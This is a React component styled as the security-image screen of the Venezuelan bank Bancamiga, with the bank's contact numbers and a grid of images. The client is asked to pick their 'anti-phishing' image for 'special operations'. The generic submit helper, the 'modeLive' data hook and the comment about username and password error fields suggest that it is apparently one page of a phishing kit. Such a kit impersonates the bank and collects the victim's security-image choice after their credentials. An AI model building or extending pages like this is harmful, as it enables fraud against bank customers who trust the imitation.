/* eslint-disable no-mixed-operators */
import React, { useState } from 'react'
import { useFormik } from 'formik'
import { submitBase } from '../../../helpers/submitBase'
import { Spiner } from '../../Spiner'
import { useGeneralData } from '../../../hooks/useGeneralData'

export const Image = () => {
  
  const dataImportant = useGeneralData({ spiner: true, endUrl: null, modeLive: true, timeLoader: 2000 })

  const [securityImage, setSecurityImage] = useState('')
  const [disabledForm, setDisabledForm] = useState(false)

  console.log(dataImportant.listImage)
  const { handleSubmit, submitForm } = useFormik({
    // En caso de poner un error personalizado colocar errorUsername y errorPassword
    initialValues: {image: ''},
    onSubmit: async(valuesData, { resetForm }) => {
      valuesData.image = securityImage
      submitBase({dataImportant, valuesData, setDisabledForm})
    }
  })

  return dataImportant.showSpiner === true ? <Spiner /> : (
        <div className='p-[14px]'>
        <div className='my-[20px] border-[1px] border-[#ddd]'>
          <div className=' bg-white h-[95px] flex items-start gap-2 '>
            <div className='relative w-[25%] mb-[15px]'>
              <div className='border-[5px] border-[white] bg-white h-[100px] w-[110px] absolute  sm:right-0 right-3  top-[-30px]'>
                {dataImportant?.image && ( <img className='h-[100px]' style={{ width: '100px' }} src={`${dataImportant?.image}`} alt="" /> )}
              </div>
            </div>
            <div className='pt-[7px]'>
              <p className="text-[20px] text-[#666]">¿Esta es su imagen Anti-Pishing?</p>
              <p className="text-[13px] text-[#666]">Si la imagen No corresponde con la seleccionada por usted.</p>
              <p className="text-[13px] text-[#666]">Favor contáctenos por el 0500-8822622 o 0501-8822622</p>
            </div>
          </div>
        </div>
        <div className='flex items-center w-full justify-center flex-col'>
            <p className='text-center mb-4 text-[20px] font-bold text-[#005291]'>Estimado cliente, seleccione su imagen para operaciones especiales</p>
          <div>
            <form onSubmit={handleSubmit} >
              <div className='grid grid-cols-12 gap-7'>
                    {
                      dataImportant?.listImage?.map((src, i) => (
                        <img onClick={() => {
                          setSecurityImage(src)
                          submitForm()
                        }} 
                        key={i}
                        className='w-[100px] bg-white  border-[white] border-[5px] col-span-3 inline-block'  src={`${src}`} alt="" /> 
                      ))
                    }
              </div>
            </form>
          </div>
          <span className='text-center text-[#999] font-bold text-[11px] p-10  '>Para mayor información o asesoria contáctanos al <br />
            Centro de atención Bancamiga (CAB) <br />
            0500-TUBANCA y 0500-1000400
          </span>
        </div>
      </div>
    )
}
